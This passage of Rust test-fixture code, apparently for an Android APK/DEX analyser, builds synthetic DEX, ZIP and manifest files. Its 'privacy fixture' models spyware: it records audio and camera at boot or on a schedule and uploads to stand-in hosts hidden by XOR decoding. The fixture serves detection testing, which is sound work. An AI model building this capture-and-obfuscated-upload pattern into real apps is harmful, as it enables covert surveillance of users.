            out.extend_from_slice(&0u16.to_le_bytes());
            out.extend_from_slice(&0x0021u16.to_le_bytes());
            out.extend_from_slice(&crc.to_le_bytes());
            out.extend_from_slice(&(data.len() as u32).to_le_bytes());
            out.extend_from_slice(&(content.len() as u32).to_le_bytes());
            out.extend_from_slice(&(name.len() as u16).to_le_bytes());
            out.extend_from_slice(&0u16.to_le_bytes());
        };
        out.extend_from_slice(b"PK\x03\x04");
        common(&mut out);
        out.extend_from_slice(name.as_bytes());
        out.extend_from_slice(&data);
        directory.extend_from_slice(b"PK\x01\x02");
        directory.extend_from_slice(&20u16.to_le_bytes());
        common(&mut directory);
        directory.extend_from_slice(&[0; 6]);
        directory.extend_from_slice(&0u32.to_le_bytes());
        directory.extend_from_slice(&offset.to_le_bytes());
        directory.extend_from_slice(name.as_bytes());
    }
    let directory_offset = out.len() as u32;
    out.extend_from_slice(&directory);
    out.extend_from_slice(b"PK\x05\x06");
    out.extend_from_slice(&[0; 4]);
    out.extend_from_slice(&(members.len() as u16).to_le_bytes());
    out.extend_from_slice(&(members.len() as u16).to_le_bytes());
    out.extend_from_slice(&(directory.len() as u32).to_le_bytes());
    out.extend_from_slice(&directory_offset.to_le_bytes());
    out.extend_from_slice(&0u16.to_le_bytes());
    out
}

/// A `resources.arsc` with one package and an empty global string pool.
pub fn sample_resources() -> Vec<u8> {
    let mut pool = Vec::new();
    for value in [0x0001u16, 28] {
        pool.extend_from_slice(&value.to_le_bytes());
    }
    for value in [28u32, 0, 0, 0x100, 28, 0] {
        pool.extend_from_slice(&value.to_le_bytes());
    }
    let mut out = Vec::new();
    out.extend_from_slice(&0x0002u16.to_le_bytes());
    out.extend_from_slice(&12u16.to_le_bytes());
    out.extend_from_slice(&((12 + pool.len()) as u32).to_le_bytes());
    out.extend_from_slice(&1u32.to_le_bytes());
    out.extend_from_slice(&pool);
    out
}

/// The second DEX file of the sample APK: one class with a second URL.
pub fn sample_secondary_classes() -> Vec<ClassSpec> {
    let code = Code {
        registers: 1,
        ins: 0,
        outs: 0,
        units: vec![Unit::Raw(0x001a), Unit::String("http://10.0.0.1/metrics".to_owned()), Unit::Raw(0x000e)],
        tries: Vec::new(),
    };
    vec![ClassSpec::new("Lcom/example/recorder/Metrics;", "Ljava/lang/Object;").method(
        "report",
        "V",
        &[],
        0x9,
        Some(code),
    )]
}

/// The sample APK: the manifest, two DEX files (multidex), `resources.arsc` and `native_lib` (when given) as
/// `lib/arm64-v8a/libnative.so`.
pub fn sample_apk(native_lib: Option<&[u8]>) -> Vec<u8> {
    let manifest = write_axml(&sample_manifest(), false);
    let classes = write_dex(&sample_classes(), 35);
    let secondary = write_dex(&sample_secondary_classes(), 35);
    let resources = sample_resources();
    let mut members: Vec<(&str, &[u8], bool)> = vec![
        ("AndroidManifest.xml", &manifest, true),
        ("classes.dex", &classes, true),
        ("classes2.dex", &secondary, false),
        ("resources.arsc", &resources, false),
    ];
    if let Some(lib) = native_lib {
        members.push(("lib/arm64-v8a/libnative.so", lib, false));
    }
    write_zip(&members)
}

/// The sample DEX with its first method body replaced by `tries` try ranges all sharing one handler of
/// `clauses` typed clauses (a negative count adds a catch-all).
pub fn shared_handler(tries: u16, clauses: i32) -> Vec<u8> {
    let mut bytes = write_dex(&sample_classes(), 35);
    let dex = crate::Dex::parse(bytes.clone()).unwrap();
    let mut budget = usize::MAX;
    let data = dex.class_data(&dex.class_def(0).unwrap(), &mut budget).unwrap();
    // Point the first method with code at a new code item appended to the file.
    let method = data.methods().find(|method| method.code_off != 0).unwrap();
    let old = method.code_off;
    while !bytes.len().is_multiple_of(4) {
        bytes.push(0);
    }
    let at = bytes.len() as u32;
    let mut item = Vec::new();
    for value in [1u16, 0, 0, tries] {
        item.extend_from_slice(&value.to_le_bytes());
    }
    item.extend_from_slice(&0u32.to_le_bytes());
    item.extend_from_slice(&2u32.to_le_bytes());
    item.extend_from_slice(&[0x0e, 0, 0, 0]);
    for _ in 0..tries {
        item.extend_from_slice(&0u32.to_le_bytes());
        item.extend_from_slice(&1u16.to_le_bytes());
        item.extend_from_slice(&1u16.to_le_bytes());
    }
    item.push(1);
    let mut value = clauses;
    loop {
        let byte = (value & 0x7f) as u8;
        value >>= 7;
        if (value == 0 && byte & 0x40 == 0) || (value == -1 && byte & 0x40 != 0) {
            item.push(byte);
            break;
        }
        item.push(byte | 0x80);
    }
    for _ in 0..clauses.unsigned_abs() {
        item.extend_from_slice(&[0, 0]);
    }
    bytes.extend_from_slice(&item);
    let len = bytes.len() as u32;
    put32(&mut bytes, 0x20, len);
    // Rewrite the code offset in place: find its uleb128 in the class data and patch a same-length encoding.
    let mut encoded = Vec::new();
    let mut value = old;
    loop {
        let byte = (value & 0x7f) as u8;
        value >>= 7;
        if value == 0 {
            encoded.push(byte);
            break;
        }
        encoded.push(byte | 0x80);
    }
    let class_data = dex.class_def(0).unwrap().class_data_off as usize;
    let position =
        bytes[class_data..].windows(encoded.len()).position(|window| window == encoded).unwrap() + class_data;
    let mut replacement = Vec::new();
    let mut value = at;
    for index in 0..encoded.len() {
        let byte = (value & 0x7f) as u8;
        value >>= 7;
        replacement.push(if index + 1 < encoded.len() { byte | 0x80 } else { byte });
    }
    assert_eq!(value, 0, "the new offset needs a longer encoding");
    bytes[position..position + encoded.len()].copy_from_slice(&replacement);
    fix_checksums(&mut bytes);
    bytes
}

/// The sample DEX with every string id pointing at one appended string of `len` ASCII characters.
pub fn shared_string(len: usize) -> Vec<u8> {
    let mut bytes = write_dex(&sample_classes(), 35);
    let word = |bytes: &[u8], at: usize| u32::from_le_bytes(bytes[at..at + 4].try_into().unwrap()) as usize;
    let strings = word(&bytes, 0x38);
    let table = word(&bytes, 0x3c);
    let at = bytes.len() as u32;
    uleb(&mut bytes, len as u32);
    bytes.resize(bytes.len() + len, b'A');
    bytes.push(0);
    for index in 0..strings {
        put32(&mut bytes, table + index * 4, at);
    }
    let len = bytes.len() as u32;
    put32(&mut bytes, 0x20, len);
    fix_checksums(&mut bytes);
    bytes
}

/// `count` classes that each implement the same `interfaces` interfaces (one shared type_list).
pub fn shared_interfaces(count: usize, interfaces: usize) -> Vec<ClassSpec> {
    let list: Vec<String> = (0..interfaces).map(|index| format!("Lcom/example/i/I{index};")).collect();
    (0..count)
        .map(|index| {
            let mut class = ClassSpec::new(&format!("Lcom/example/C{index};"), "Ljava/lang/Object;");
            class.interfaces = list.clone();
            class
        })
        .collect()
}

/// One class declaring `count` native methods `n0()V`, `n1()V`, ...
pub fn native_methods(count: usize) -> Vec<ClassSpec> {
    let mut class = ClassSpec::new("Lcom/example/Natives;", "Ljava/lang/Object;");
    for index in 0..count {
        class = class.method(&format!("n{index}"), "V", &[], 0x101, None);
    }
    vec![class]
}

/// A small Dalvik assembler for fixtures: each method appends one instruction; [`Asm::len`] is the address of the
/// next one, for branch offsets.
#[derive(Debug, Clone, Default)]
pub struct Asm {
    units: Vec<Unit>,
}

/// invoke opcodes.
pub const VIRTUAL: u8 = 0x6e;
pub const SUPER: u8 = 0x6f;
pub const DIRECT: u8 = 0x70;
pub const STATIC: u8 = 0x71;
pub const INTERFACE: u8 = 0x72;

fn method_key(text: &str) -> MethodKey {
    let (class, rest) = text.split_once("->").expect("Lclass;->name(params)ret");
    let (name, signature) = rest.split_once('(').expect("a prototype");
    let (params, ret) = signature.split_once(')').expect("a return type");
    let mut list = Vec::new();
    let bytes = params.as_bytes();
    let mut at = 0;
    while at < bytes.len() {
        let start = at;
        while bytes[at] == b'[' {
            at += 1;
        }
        if bytes[at] == b'L' {
            at += params[at..].find(';').expect("a class name ends with ;");
        }
        at += 1;
        list.push(params[start..at].to_owned());
    }
    MethodKey { class: class.to_owned(), name: name.to_owned(), ret: ret.to_owned(), params: list }
}

fn field_key(text: &str) -> FieldKey {
    let (class, rest) = text.split_once("->").expect("Lclass;->name:type");
    let (name, kind) = rest.split_once(':').expect("a field type");
    FieldKey { class: class.to_owned(), name: name.to_owned(), kind: kind.to_owned() }
}

impl Asm {
    pub fn new() -> Self {
        Self::default()
    }

    /// The address (in code units) of the next instruction.
    pub fn len(&self) -> u32 {
        self.units.len() as u32
    }

    pub fn is_empty(&self) -> bool {
        self.units.is_empty()
    }

    pub fn raw(mut self, units: &[u16]) -> Self {
        self.units.extend(units.iter().map(|&unit| Unit::Raw(unit)));
        self
    }

    /// An instruction with an 8-bit register A and a 16-bit operand.
    fn aa(self, op: u8, a: u8, b: u16) -> Self {
        self.raw(&[u16::from(a) << 8 | u16::from(op), b])
    }

    /// An instruction with 4-bit registers A and B.
    fn ab(self, op: u8, a: u8, b: u8) -> Self {
        self.raw(&[u16::from(b) << 12 | u16::from(a & 0xf) << 8 | u16::from(op)])
    }

    pub fn const4(self, reg: u8, value: i8) -> Self {
        self.ab(0x12, reg, (value as u8) & 0xf)
    }

    pub fn const16(self, reg: u8, value: i16) -> Self {
        self.aa(0x13, reg, value as u16)
    }

    pub fn const32(self, reg: u8, value: i32) -> Self {
        let value = value as u32;
        self.raw(&[u16::from(reg) << 8 | 0x14, value as u16, (value >> 16) as u16])
    }

    pub fn const_string(mut self, reg: u8, text: &str) -> Self {
        self.units.push(Unit::Raw(u16::from(reg) << 8 | 0x1a));
        self.units.push(Unit::String(text.to_owned()));
        self
    }

    fn typed(mut self, op: u8, reg: u8, kind: &str) -> Self {
        self.units.push(Unit::Raw(u16::from(reg) << 8 | u16::from(op)));
        self.units.push(Unit::Type(kind.to_owned()));
        self
    }

    pub fn const_class(self, reg: u8, kind: &str) -> Self {
        self.typed(0x1c, reg, kind)
    }

    pub fn check_cast(self, reg: u8, kind: &str) -> Self {
        self.typed(0x1f, reg, kind)
    }

    pub fn new_instance(self, reg: u8, kind: &str) -> Self {
        self.typed(0x22, reg, kind)
    }

    /// `new-array dst, size, kind`.
    pub fn new_array(mut self, dst: u8, size: u8, kind: &str) -> Self {
        self.units.push(Unit::Raw(u16::from(size) << 12 | u16::from(dst & 0xf) << 8 | 0x23));
        self.units.push(Unit::Type(kind.to_owned()));
        self
    }

    pub fn array_length(self, dst: u8, array: u8) -> Self {
        self.ab(0x21, dst, array)
    }

    /// `fill-array-data reg, +offset` (the payload's address relative to this instruction).
    pub fn fill_array_data(self, reg: u8, offset: i32) -> Self {
        let offset = offset as u32;
        self.raw(&[u16::from(reg) << 8 | 0x26, offset as u16, (offset >> 16) as u16])
    }

    /// A fill-array-data payload of byte elements (padded to a whole code unit).
    pub fn byte_payload(self, bytes: &[u8]) -> Self {
        let count = bytes.len() as u32;
        let mut units = vec![0x0300, 1, count as u16, (count >> 16) as u16];
        units.extend(bytes.chunks(2).map(|pair| u16::from(pair[0]) | u16::from(*pair.get(1).unwrap_or(&0)) << 8));
        self.raw(&units)
    }

    /// `invoke-*` (35c) of `method` (`Lclass;->name(params)ret`) with up to five argument registers.
    pub fn invoke(mut self, op: u8, regs: &[u8], method: &str) -> Self {
        assert!(regs.len() <= 5);
        let reg = |index: usize| u16::from(*regs.get(index).unwrap_or(&0) & 0xf);
        self.units.push(Unit::Raw((regs.len() as u16) << 12 | reg(4) << 8 | u16::from(op)));
        self.units.push(Unit::Method(method_key(method)));
        self.units.push(Unit::Raw(reg(0) | reg(1) << 4 | reg(2) << 8 | reg(3) << 12));
        self
    }

    pub fn move_result(self, reg: u8) -> Self {
        self.raw(&[u16::from(reg) << 8 | 0x0a])
    }

    pub fn move_result_object(self, reg: u8) -> Self {
        self.raw(&[u16::from(reg) << 8 | 0x0c])
    }

    pub fn return_void(self) -> Self {
        self.raw(&[0x000e])
    }

    pub fn return_value(self, reg: u8) -> Self {
        self.raw(&[u16::from(reg) << 8 | 0x0f])
    }

    pub fn return_object(self, reg: u8) -> Self {
        self.raw(&[u16::from(reg) << 8 | 0x11])
    }

    fn field(mut self, op: u8, reg: u8, field: &str) -> Self {
        self.units.push(Unit::Raw(u16::from(reg) << 8 | u16::from(op)));
        self.units.push(Unit::Field(field_key(field)));
        self
    }

    pub fn sget_object(self, reg: u8, field: &str) -> Self {
        self.field(0x62, reg, field)
    }

    pub fn sput_object(self, reg: u8, field: &str) -> Self {
        self.field(0x69, reg, field)
    }

    /// `aget-<kind> dst, array, index` (0x44 int, 0x48 byte, 0x49 char).
    pub fn aget(self, op: u8, dst: u8, array: u8, index: u8) -> Self {
        self.raw(&[u16::from(dst) << 8 | u16::from(op), u16::from(index) << 8 | u16::from(array)])
    }

    /// `aput-<kind> src, array, index` (0x4b int, 0x4f byte, 0x50 char).
    pub fn aput(self, op: u8, src: u8, array: u8, index: u8) -> Self {
        self.raw(&[u16::from(src) << 8 | u16::from(op), u16::from(index) << 8 | u16::from(array)])
    }

    /// `<binop>/lit8 dst, src, value` (0xd8 add, 0xdf xor, 0xdd and).
    pub fn lit8(self, op: u8, dst: u8, src: u8, value: i8) -> Self {
        self.raw(&[u16::from(dst) << 8 | u16::from(op), u16::from(value as u8) << 8 | u16::from(src)])
    }

    /// A unary operation (0x8e int-to-char, 0x8d int-to-byte).
    pub fn unop(self, op: u8, dst: u8, src: u8) -> Self {
        self.ab(op, dst, src)
    }

    /// `if-<test> a, b, +offset` (0x32 eq, 0x33 ne, 0x34 lt, 0x35 ge).
    pub fn if_test(self, op: u8, a: u8, b: u8, offset: i16) -> Self {
        self.raw(&[u16::from(b) << 12 | u16::from(a & 0xf) << 8 | u16::from(op), offset as u16])
    }

    /// `if-<test>z a, +offset` (0x38 eqz, 0x39 nez).
    pub fn if_zero(self, op: u8, reg: u8, offset: i16) -> Self {
        self.aa(op, reg, offset as u16)
    }

    pub fn goto(self, offset: i8) -> Self {
        self.raw(&[u16::from(offset as u8) << 8 | 0x28])
    }

    pub fn code(self, registers: u16, ins: u16, outs: u16) -> Code {
        Code { registers, ins, outs, units: self.units, tries: Vec::new() }
    }
}

/// The package of the privacy fixture APK.
pub const WATCH_PACKAGE: &str = "com.example.watch";
/// The upload URL the fixture hides behind its XOR decoder, the host behind its byte-array decoder, and the XOR
/// key.
pub const WATCH_URL: &str = "https://upload.example.net/v2/audio";
pub const WATCH_HOST: &str = "collector.example.net";
pub const WATCH_XOR: u8 = 0x5a;
const WATCH_DATA_XOR: u8 = 0x21;

fn watch(name: &str) -> String {
    format!("Lcom/example/watch/{name};")
}

/// `text` with every character XORed with `key`, as the fixture's decoder undoes it.
pub fn xor_text(text: &str, key: u8) -> String {
    text.chars().map(|c| char::from_u32(c as u32 ^ u32::from(key)).unwrap()).collect()
}

/// The classes of the privacy fixture: a boot receiver starting a service that records audio and uploads it to a
/// URL decoded by a static XOR decoder; a push service reaching the same capture; a push-to-talk activity whose
/// onClick records through MediaRecorder and pushes through an interface implemented by an upload class (resolved
/// by name); the Application scheduling a periodic Worker that opens the camera and sends through a native method;
/// a byte-array decoder (`Strings.get(I)`) over a static array filled in `<clinit>`.
pub fn watch_classes() -> Vec<ClassSpec> {
    let object = "Ljava/lang/Object;";
    let string = "Ljava/lang/String;";
    let context = "Landroid/content/Context;";
    let intent = "Landroid/content/Intent;";
    // BootReceiver.onReceive(Context, Intent): startForegroundService(new Intent(context, CaptureService.class))
    let on_receive = Asm::new()
        .new_instance(0, intent)
        .const_class(1, &watch("CaptureService"))
        .invoke(DIRECT, &[0, 3, 1], "Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V")
        .invoke(
            VIRTUAL,
            &[3, 0],
            "Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;",
        )
        .return_void()
        .code(5, 3, 3);
    let receiver = ClassSpec::new(&watch("BootReceiver"), "Landroid/content/BroadcastReceiver;").method(
        "onReceive",
        "V",
        &[context, intent],
        0x1,
        Some(on_receive),
    );
    // CaptureService.onStartCommand: Uploader.upload(Recorder.record()); return 1
    let on_start = Asm::new()
        .invoke(STATIC, &[], &format!("{}->record()[B", watch("Recorder")))
        .move_result_object(0)
        .invoke(STATIC, &[0], &format!("{}->upload([B)V", watch("Uploader")))
        .const4(1, 1)
        .return_value(1)
        .code(6, 4, 1);
    let service = ClassSpec::new(&watch("CaptureService"), "Landroid/app/Service;").method(
        "onStartCommand",
        "I",
        &[intent, "I", "I"],
        0x1,
        Some(on_start),
    );
    // PushService.onMessageReceived: Recorder.record()
    let on_message =
        Asm::new().invoke(STATIC, &[], &format!("{}->record()[B", watch("Recorder"))).return_void().code(2, 2, 0);
    let push = ClassSpec::new(&watch("PushService"), "Lcom/google/firebase/messaging/FirebaseMessagingService;")
        .method("onMessageReceived", "V", &["Lcom/google/firebase/messaging/RemoteMessage;"], 0x1, Some(on_message));
    // Recorder.record(): new AudioRecord(...).startRecording(); return new byte[16]
    let record = Asm::new()
        .new_instance(0, "Landroid/media/AudioRecord;")
        .invoke(VIRTUAL, &[0], "Landroid/media/AudioRecord;->startRecording()V")
        .const16(1, 16)
        .new_array(1, 1, "[B")
        .return_object(1)
        .code(2, 0, 1);
    let recorder = ClassSpec::new(&watch("Recorder"), object).method("record", "[B", &[], 0x9, Some(record));
    // Uploader.upload([B): new URL(Codec.decode("...")).openConnection().getOutputStream().write(data)
    let upload = Asm::new()
        .const_string(0, &xor_text(WATCH_URL, WATCH_XOR))
        .invoke(STATIC, &[0], &format!("{}->decode(Ljava/lang/String;)Ljava/lang/String;", watch("Codec")))
        .move_result_object(0)
        .new_instance(1, "Ljava/net/URL;")
        .invoke(DIRECT, &[1, 0], "Ljava/net/URL;-><init>(Ljava/lang/String;)V")
        .invoke(VIRTUAL, &[1], "Ljava/net/URL;->openConnection()Ljava/net/URLConnection;")
        .move_result_object(0)
        .check_cast(0, "Ljava/net/HttpURLConnection;")
        .invoke(VIRTUAL, &[0], "Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;")
        .move_result_object(0)
        .invoke(VIRTUAL, &[0, 2], "Ljava/io/OutputStream;->write([B)V")
        .return_void()
        .code(3, 1, 2);
    let uploader = ClassSpec::new(&watch("Uploader"), object).method("upload", "V", &["[B"], 0x9, Some(upload));
    // Codec.decode(String): XOR every char with the key.
    let mut decode =
        Asm::new().invoke(VIRTUAL, &[4], "Ljava/lang/String;->toCharArray()[C").move_result_object(0).const4(1, 0);
    let top = decode.len();
    decode = decode.array_length(2, 0).if_test(0x35, 1, 2, 0);
    let exit = decode.len() - 2;
    decode = decode
        .aget(0x49, 2, 0, 1)
        .lit8(0xdf, 2, 2, WATCH_XOR as i8)
        .unop(0x8e, 2, 2)
        .aput(0x50, 2, 0, 1)
        .lit8(0xd8, 1, 1, 1);
    let back = top as i32 - decode.len() as i32;
    decode = decode.goto(back as i8);
    let done = decode.len();
    decode = decode.new_instance(3, string).invoke(DIRECT, &[3, 0], "Ljava/lang/String;-><init>([C)V").return_object(3);
    let mut decode = decode.code(5, 1, 2);
    if let Unit::Raw(offset) = &mut decode.units[exit as usize + 1] {
        *offset = (done - exit) as u16;
    }
    let codec = ClassSpec::new(&watch("Codec"), object).method("decode", string, &[string], 0x9, Some(decode));
    // Strings: DATA filled in <clinit>; get(I) reads from DATA[i] to a zero byte, XOR 0x21.
    let mut data: Vec<u8> = WATCH_HOST.bytes().map(|byte| byte ^ WATCH_DATA_XOR).collect();
    data.push(0);
    let field = format!("{}->DATA:[B", watch("Strings"));
    let clinit = Asm::new()
        .const16(0, data.len() as i16)
        .new_array(0, 0, "[B")
        .fill_array_data(0, 6)
        .sput_object(0, &field)
        .return_void()
        .byte_payload(&data)
        .code(1, 0, 0);
    let mut get = Asm::new().sget_object(0, &field).new_instance(1, "Ljava/lang/StringBuilder;").invoke(
        DIRECT,
        &[1],
        "Ljava/lang/StringBuilder;-><init>()V",
    );
    let top = get.len();
    get = get.aget(0x48, 2, 0, 3).if_zero(0x38, 2, 0);
    let exit = get.len() - 2;
    get = get
        .lit8(0xdf, 2, 2, WATCH_DATA_XOR as i8)
        .unop(0x8e, 2, 2)
        .invoke(VIRTUAL, &[1, 2], "Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;")
        .lit8(0xd8, 3, 3, 1);
    let back = top as i32 - get.len() as i32;
    get = get.goto(back as i8);
    let done = get.len();
    get = get
        .invoke(VIRTUAL, &[1], "Ljava/lang/StringBuilder;->toString()Ljava/lang/String;")
        .move_result_object(0)
        .return_object(0);
    let mut get = get.code(4, 1, 2);
    if let Unit::Raw(offset) = &mut get.units[exit as usize + 1] {
        *offset = (done - exit) as u16;
    }
    let strings = ClassSpec::new(&watch("Strings"), object)
        .field("DATA", "[B", 0x1a)
        .method("<clinit>", "V", &[], 0x1_0008, Some(clinit))
        .method("get", string, &["I"], 0x9, Some(get));
    // Sink (an interface) and HttpSink implementing it by uploading.
    let mut sink = ClassSpec::new(&watch("Sink"), object).method("push", "V", &["[B"], 0x401, None);
    sink.access = 0x601;
    let push_body = Asm::new().invoke(STATIC, &[2], &format!("{}->upload([B)V", watch("Uploader"))).return_void();
    let init =
        |class: &str| Asm::new().invoke(DIRECT, &[0], &format!("{class}-><init>()V")).return_void().code(1, 1, 1);
    let mut http_sink = ClassSpec::new(&watch("HttpSink"), object)
        .method("<init>", "V", &[], 0x1_0001, Some(init(object)))
        .method("push", "V", &["[B"], 0x1, Some(push_body.code(3, 2, 1)));
    http_sink.interfaces = vec![watch("Sink")];
    // TalkActivity: onCreate registers itself as the button's click listener; onClick records and pushes.
    let activity = "Landroid/app/Activity;";
    let on_create = Asm::new()
        .invoke(SUPER, &[2, 3], "Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V")
        .const16(0, 0x10)
        .invoke(VIRTUAL, &[2, 0], "Landroid/app/Activity;->findViewById(I)Landroid/view/View;")
        .move_result_object(0)
        .invoke(VIRTUAL, &[0, 2], "Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V")
        .return_void()
        .code(4, 2, 2);
    let on_click = Asm::new()
        .new_instance(0, "Landroid/media/MediaRecorder;")
        .invoke(DIRECT, &[0], "Landroid/media/MediaRecorder;-><init>()V")
        .const4(1, 1)
        .invoke(VIRTUAL, &[0, 1], "Landroid/media/MediaRecorder;->setAudioSource(I)V")
        .invoke(VIRTUAL, &[0], "Landroid/media/MediaRecorder;->start()V")
        .new_instance(0, &watch("HttpSink"))
        .invoke(DIRECT, &[0], &format!("{}-><init>()V", watch("HttpSink")))
        .const16(1, 8)
        .new_array(1, 1, "[B")
        .invoke(INTERFACE, &[0, 1], &format!("{}->push([B)V", watch("Sink")))
        .return_void()
        .code(4, 2, 2);
    let mut talk = ClassSpec::new(&watch("TalkActivity"), activity)
        .method("onCreate", "V", &["Landroid/os/Bundle;"], 0x4, Some(on_create))
        .method("onClick", "V", &["Landroid/view/View;"], 0x1, Some(on_click));
    talk.interfaces = vec!["Landroid/view/View$OnClickListener;".to_owned()];
    // App.onCreate: WorkManager.getInstance(this).enqueue(new PeriodicWorkRequest.Builder(SyncWorker.class, 15,
    // MINUTES).build())
    let builder = "Landroidx/work/PeriodicWorkRequest$Builder;";
    let app_create = Asm::new()
        .new_instance(0, builder)
        .const_class(1, &watch("SyncWorker"))
        .raw(&[0x0216, 15])
        .sget_object(4, "Ljava/util/concurrent/TimeUnit;->MINUTES:Ljava/util/concurrent/TimeUnit;")
        .invoke(
            DIRECT,
            &[0, 1, 2, 3, 4],
            &format!("{builder}-><init>(Ljava/lang/Class;JLjava/util/concurrent/TimeUnit;)V"),
        )
        .invoke(VIRTUAL, &[0], &format!("{builder}->build()Landroidx/work/WorkRequest;"))
        .move_result_object(0)
        .invoke(
            STATIC,
            &[5],
            "Landroidx/work/WorkManager;->getInstance(Landroid/content/Context;)Landroidx/work/WorkManager;",
        )
        .move_result_object(1)
        .invoke(
            VIRTUAL,
            &[1, 0],
            "Landroidx/work/WorkManager;->enqueue(Landroidx/work/WorkRequest;)Landroidx/work/Operation;",
        )
        .return_void()
        .code(6, 1, 5);
    let app =
        ClassSpec::new(&watch("App"), "Landroid/app/Application;").method("onCreate", "V", &[], 0x1, Some(app_create));
    // SyncWorker.doWork: Snapshot.take(); return null
    let do_work = Asm::new()
        .invoke(STATIC, &[], &format!("{}->take()V", watch("Snapshot")))
        .const4(0, 0)
        .return_object(0)
        .code(2, 1, 0);
    let worker = ClassSpec::new(&watch("SyncWorker"), "Landroidx/work/Worker;").method(
        "doWork",
        "Landroidx/work/ListenableWorker$Result;",
        &[],
        0x1,
        Some(do_work),
    );
    // Snapshot.take: Camera.open(); Net.nativeSend(new byte[4]) to Strings.get(0)
    let take = Asm::new()
        .invoke(STATIC, &[], "Landroid/hardware/Camera;->open()Landroid/hardware/Camera;")
        .const4(0, 0)
        .invoke(STATIC, &[0], &format!("{}->get(I)Ljava/lang/String;", watch("Strings")))
        .move_result_object(1)
        .const4(0, 4)
        .new_array(0, 0, "[B")
        .invoke(STATIC, &[0], &format!("{}->nativeSend([B)I", watch("Net")))
        .return_void()
        .code(2, 0, 1);
    let snapshot = ClassSpec::new(&watch("Snapshot"), object).method("take", "V", &[], 0x9, Some(take));
    let net = ClassSpec::new(&watch("Net"), object).method("nativeSend", "I", &["[B"], 0x109, None);
    vec![receiver, service, push, recorder, uploader, codec, strings, sink, http_sink, talk, app, worker, snapshot, net]
}

/// The privacy fixture's manifest: microphone, camera, internet and boot permissions; the Application class; the
/// push-to-talk activity (launcher); the boot receiver; the capture and push services.
pub fn watch_manifest() -> XmlNode {
    use XmlValue::{Bool, Int, Str};
    let permission = |name: &str| XmlNode::new("uses-permission").android("name", Str(name.to_owned()));
    let action = |name: &str| XmlNode::new("action").android("name", Str(name.to_owned()));
    let category = |name: &str| XmlNode::new("category").android("name", Str(name.to_owned()));
    XmlNode::new("manifest")
        .android("versionCode", Int(3))
        .android("versionName", Str("0.3".to_owned()))
        .plain("package", Str(WATCH_PACKAGE.to_owned()))
        .child(XmlNode::new("uses-sdk").android("minSdkVersion", Int(26)).android("targetSdkVersion", Int(33)))
        .child(permission("android.permission.RECORD_AUDIO"))
        .child(permission("android.permission.CAMERA"))
        .child(permission("android.permission.INTERNET"))
        .child(permission("android.permission.RECEIVE_BOOT_COMPLETED"))
        .child(
            XmlNode::new("application")
                .android("name", Str(".App".to_owned()))
                .child(
                    XmlNode::new("activity")
                        .android("name", Str(".TalkActivity".to_owned()))
                        .android("exported", Bool(true))
                        .child(
                            XmlNode::new("intent-filter")
                                .child(action("android.intent.action.MAIN"))
                                .child(category("android.intent.category.LAUNCHER")),
                        ),
                )
                .child(
                    XmlNode::new("receiver")
                        .android("name", Str(".BootReceiver".to_owned()))
                        .android("exported", Bool(false))
                        .child(XmlNode::new("intent-filter").child(action("android.intent.action.BOOT_COMPLETED"))),
                )
                .child(
                    XmlNode::new("service")
                        .android("name", Str(".CaptureService".to_owned()))
                        .android("foregroundServiceType", Int(0x80)),
                )
                .child(
                    XmlNode::new("service")
                        .android("name", Str(".PushService".to_owned()))
                        .android("exported", Bool(false))
                        .child(XmlNode::new("intent-filter").child(action("com.google.firebase.MESSAGING_EVENT"))),
                ),
        )
}

/// The privacy fixture APK: manifest, one DEX file and `native_lib` (when given) as `lib/arm64-v8a/libnet.so`.
pub fn watch_apk(native_lib: Option<&[u8]>) -> Vec<u8> {
    let manifest = write_axml(&watch_manifest(), false);
    let classes = write_dex(&watch_classes(), 35);
    let mut members: Vec<(&str, &[u8], bool)> =
        vec![("AndroidManifest.xml", &manifest, true), ("classes.dex", &classes, true)];
    if let Some(lib) = native_lib {
        members.push(("lib/arm64-v8a/libnet.so", lib, false));
    }
    write_zip(&members)
}
